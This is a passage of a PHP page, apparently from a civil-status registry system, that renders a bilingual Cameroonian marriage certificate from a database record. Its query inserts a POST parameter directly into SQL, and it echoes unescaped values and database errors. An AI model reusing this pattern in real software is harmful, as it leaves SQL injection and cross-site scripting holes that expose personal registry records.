<?php

if(isset($_POST['mid'])){
	session_start();
	//import database connection
	include_once 'conndb.php';
	
	$mid = $_POST['mid'];

	$sql = "SELECT *
	        FROM Marriage_Certificate a, Witness b
	        WHERE a.Mar_id = '$mid' AND b.Mar_id = '$mid'";
	        $value = mysqli_query($conn, $sql) or die('Could not get the database values'.mysqli_error($conn));

	        $row = mysqli_fetch_assoc($value) or die('Could not fetch the values'.mysqli_error($conn));
 
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
  <title><?php echo $row['Pub_id']; ?></title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet" type="text/css" />
	<!-- icons -->
	<link href="fonts/simple-line-icons/simple-line-icons.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="fonts/material-design-icons/material-icon.css" rel="stylesheet" type="text/css" />
	<!--bootstrap -->
	<link href="../assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<!-- data tables -->
	<link href="../assets/plugins/datatables/plugins/bootstrap/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css" />
	<!-- Material Design Lite CSS -->
	<link rel="stylesheet" href="../assets/plugins/material/material.min.css">
	<link rel="stylesheet" href="../assets/css/material_style.css">
	<!-- Theme Styles -->
	<link href="../assets/css/theme/dark/theme_style.css" rel="stylesheet" id="rt_style_components" type="text/css" />
	<link href="../assets/css/theme/dark/style.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/plugins.min.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/responsive.css" rel="stylesheet" type="text/css" />
	<link href="../assets/css/theme/dark/theme-color.css" rel="stylesheet" type="text/css" />
	<!-- favicon -->
	<link rel="shortcut icon" href="http://radixtouch.in/templates/admin/smart/source/assets/img/favicon.ico" />

  <style type="text/css">
    a {text-decoration: none}
  </style>
</head>
<body text="#000000" link="#000000" alink="#000000" vlink="#000000">
	<div id="mc">
<table width="100%" cellpadding="0" cellspacing="0" border="0">
<tr><td width="50%">&nbsp;</td><td align="center">

<a name="JR_PAGE_ANCHOR_0_1"></a>
<table class="jrPage" cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 595px; border-collapse: collapse; background-color: white;">
<tr valign="top" style="height:0">
<td style="width:19px"></td>
<td style="width:1px"></td>
<td style="width:1px"></td>
<td style="width:14px"></td>
<td style="width:5px"></td>
<td style="width:20px"></td>
<td style="width:4px"></td>
<td style="width:27px"></td>
<td style="width:23px"></td>
<td style="width:29px"></td>
<td style="width:17px"></td>
<td style="width:27px"></td>
<td style="width:13px"></td>
<td style="width:10px"></td>
<td style="width:30px"></td>
<td style="width:7px"></td>
<td style="width:13px"></td>
<td style="width:81px"></td>
<td style="width:6px"></td>
<td style="width:13px"></td>
<td style="width:37px"></td>
<td style="width:13px"></td>
<td style="width:11px"></td>
<td style="width:16px"></td>
<td style="width:3px"></td>
<td style="width:30px"></td>
<td style="width:10px"></td>
<td style="width:5px"></td>
<td style="width:55px"></td>
<td style="width:10px"></td>
<td style="width:10px"></td>
<td style="width:4px"></td>
<td style="width:10px"></td>
<td style="width:3px"></td>
<td style="width:18px"></td>
</tr>
<tr valign="top" style="height:30px">
<td colspan="35">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="13">
</td>
<td colspan="9" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">REPUBLIQUE DU CAMEROUN</span></td>
<td colspan="13">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="16">
</td>
<td colspan="3" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Paix - Travail - Patrie</span></td>
<td colspan="16">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="14">
</td>
<td colspan="7" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">REPUBLIC OF CAMEROON</span></td>
<td colspan="14">
</td>
</tr>
<tr valign="top" style="height:10px">
<td colspan="15">
</td>
<td colspan="5" rowspan="3" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;">Peace - Work - Fatherland</span></td>
<td colspan="15">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="15">
</td>
<td colspan="5">
</td>
<td colspan="4" rowspan="4" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">REGION</span></td>
<td colspan="6">
</td>
</tr>
<tr valign="top" style="height:9px">
<td colspan="6">
</td>
<td colspan="5" rowspan="4" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">REGION</span></td>
<td colspan="4">
</td>
<td colspan="5">
</td>
<td colspan="6">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="6">
</td>
<td colspan="6">
</td>
<td style="border-top: 2px solid #000000; ">
</td>
<td colspan="7">
</td>
<td colspan="6">
</td>
</tr>
<tr valign="top" style="height:8px">
<td colspan="6">
</td>
<td colspan="14">
</td>
<td colspan="6">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="6">
</td>
<td colspan="24">
</td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="5">
</td>
<td colspan="7" rowspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:22px"></td>
<td style="width:100px"></td>
<td style="width:25px"></td>
</tr>
<tr valign="top" style="height:18px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">DEPARTEMENT</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:7px"></td>
<td style="width:133px"></td>
<td style="width:7px"></td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:140px"></td>
</tr>
<tr valign="top" style="height:17px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:20px"></td>
<td style="width:100px"></td>
<td style="width:20px"></td>
</tr>
<tr valign="top" style="height:19px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['region']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:18px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:33px">
<td>
</td>
<td colspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:130px"></td>
<td style="width:10px"></td>
</tr>
<tr valign="top" style="height:13px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">ARRONDISSEMENT</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:140px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:140px"></td>
</tr>
<tr valign="top" style="height:13px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:15px"></td>
<td style="width:100px"></td>
<td style="width:25px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['division']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:12px">
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="11">
</td>
<td colspan="8">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:139px"></td>
</tr>
<tr valign="top" style="height:18px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:19px"></td>
<td style="width:100px"></td>
<td style="width:20px"></td>
</tr>
<tr valign="top" style="height:19px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['region']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="5">
</td>
<td colspan="23">
</td>
</tr>
<tr valign="top" style="height:50px">
<td colspan="5">
</td>
<td colspan="11">
</td>
<td colspan="8" rowspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:19px"></td>
<td style="width:100px"></td>
<td style="width:20px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">DIVISION</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:139px"></td>
</tr>
<tr valign="top" style="height:17px">
<td>
</td>
</tr>
<tr valign="top" style="height:53px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:19px"></td>
<td style="width:100px"></td>
<td style="width:20px"></td>
</tr>
<tr valign="top" style="height:14px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 13px; line-height: 1.2578125; font-weight: bold;">SUBDIVISION</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:18px"></td>
<td style="width:100px"></td>
<td style="width:21px"></td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:19px"></td>
<td style="width:100px"></td>
<td style="width:20px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['division']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:139px"></td>
</tr>
<tr valign="top" style="height:13px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:6px">
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:13px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['subdiv']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="6">
</td>
<td colspan="5" style="text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $_SESSION['subdiv']; ?></span></td>
<td colspan="12">
</td>
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="4">
</td>
<td colspan="28">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:45px"></td>
<td style="width:198px"></td>
<td style="width:286px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 14px; line-height: 1.2578125; font-weight: bold;">CENTRE D'ETAT CIVIL</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:140px"></td>
<td style="width:85px"></td>
<td style="width:304px"></td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
<td rowspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:160px"></td>
<td style="width:139px"></td>
<td style="width:5px"></td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:304px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 14px; line-height: 1.2578125;">/ CIVIL STATUS REGISTRATION CENTRE</span></td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="2">
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:50px">
<td colspan="2">
</td>
<td colspan="28">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:70px"></td>
<td style="width:460px"></td>
</tr>
<tr valign="top" style="height:10px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:30px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 14px; line-height: 1.2578125; font-weight: bold;">De - Of</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:33px"></td>
<td style="width:17px"></td>
<td style="width:220px"></td>
<td style="width:258px"></td>
<td style="width:2px"></td>
</tr>
<tr valign="top" style="height:26px">
<td colspan="2">
</td>
<td colspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:478px"></td>
</tr>
<tr valign="top" style="height:25px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:460px"></td>
<td style="width:18px"></td>
</tr>
<tr valign="top" style="height:26px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 16px; line-height: 1.2578125;"><?php echo $_SESSION['subdiv']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:24px">
<td>
</td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 18px; line-height: 1.2578125; font-weight: bold;">ACTE DE MARRIAGE</span></td>
<td colspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 18px; line-height: 1.2578125;">/ MARRIAGE CERTIFICATE</span></td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="5">
</td>
</tr>
<tr valign="top" style="height:28px">
<td colspan="10">
</td>
<td colspan="14">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:37px"></td>
<td style="width:257px"></td>
</tr>
<tr valign="top" style="height:4px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:24px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 15px; line-height: 1.2578125;">N°</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:15px"></td>
<td style="width:1px"></td>
<td style="width:277px"></td>
<td style="width:1px"></td>
</tr>
<tr valign="top" style="height:24px">
<td colspan="2">
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 16px; line-height: 1.2578125;"><?php echo $row['Pub_id']; ?></span></td>
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td colspan="3" style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="4">
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="11">
</td>
</tr>
<tr valign="top" style="height:2px">
<td colspan="35">
</td>
</tr>
<tr valign="top" style="height:54px">
<td>
</td>
<td colspan="32">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:115px"></td>
<td style="width:440px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Marriage de</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:554px"></td>
</tr>
<tr valign="top" style="height:5px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:49px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:110px"></td>
<td style="width:441px"></td>
<td style="width:3px"></td>
</tr>
<tr valign="top" style="height:19px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:92px"></td>
<td style="width:420px"></td>
<td style="width:42px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 14px; line-height: 1.2578125;"><?php echo $row['BgName']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:100px"></td>
<td style="width:12px"></td>
<td style="width:4px"></td>
<td style="width:9px"></td>
<td style="width:418px"></td>
<td style="width:11px"></td>
</tr>
<tr valign="top" style="height:9px">
<td colspan="6">
</td>
</tr>
<tr valign="top" style="height:15px">
<td colspan="2" rowspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Marriage of</span></td>
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:5px">
<td colspan="2">
</td>
<td rowspan="2" style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 10px; line-height: 1.2578125;"><?php echo $row['BrName']; ?></span></td>
<td>
</td>
</tr>
<tr valign="top" style="height:16px">
<td rowspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:70px"></td>
<td style="width:30px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Et de</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:31px"></td>
<td style="width:69px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">&nbsp; - And of</span></td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="3">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="2">
</td>
<td colspan="3" style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="5">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="2">
</td>
<td colspan="31">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:50px"></td>
<td style="width:504px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Le</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:25px"></td>
<td style="width:529px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:50px"></td>
<td style="width:479px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- On the</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:35px"></td>
<td style="width:494px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:494px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
</tr>
